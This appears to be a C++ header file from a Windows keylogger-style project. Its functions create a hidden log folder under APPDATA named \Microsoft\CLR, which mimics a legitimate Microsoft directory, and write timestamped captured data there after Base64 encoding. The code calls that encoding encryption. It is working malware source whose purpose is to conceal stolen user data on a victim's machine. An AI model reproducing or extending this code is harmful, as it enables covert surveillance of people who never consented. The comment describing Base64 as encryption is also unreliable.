#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO{
    std::string GetOurPath(const bool append_separator = false){
        std::string appdata_dir(getenv("APPDATA"));//basically gets the appdata directory on whatever computer it's running on
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\":"");
    }
    //make a dir
    bool MkOneDr(std::string path){
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }
    bool MKDir(std::string path){
        for(char &c :path)
            if(c == '\\')
            {
                 c = '\0';
                if(!MkOneDr(path))
                    return false;
                c = '\\';
            }
           return true;
        }
        template <class T>
        std::string WriteLog(const T &t){
            std::string path = GetOurPath(true);
            Helper::DateTime dt;
            std::string name = dt.GetDateTimeString("_") + ".log"; //we use _ not : because : is reserved in windows for files

            try{
                std::ofstream file(path + name);
                if(!file){
                    return "";
                }
                std::ostringstream s;
                s<<"["<<dt.GetDateTimeString()<<"]"<<std::endl<<
                t<<std::endl;

                //then you encrypt the file
                std::string data = Base64::EncryptB64(s.str());
                //then put it in the file
                file<<data;

                //precautions
                if(!file)
                    return "";
                file.close();

                return name;
            }catch(...){
                return "";
            }
        }
}

#endif // IO_H
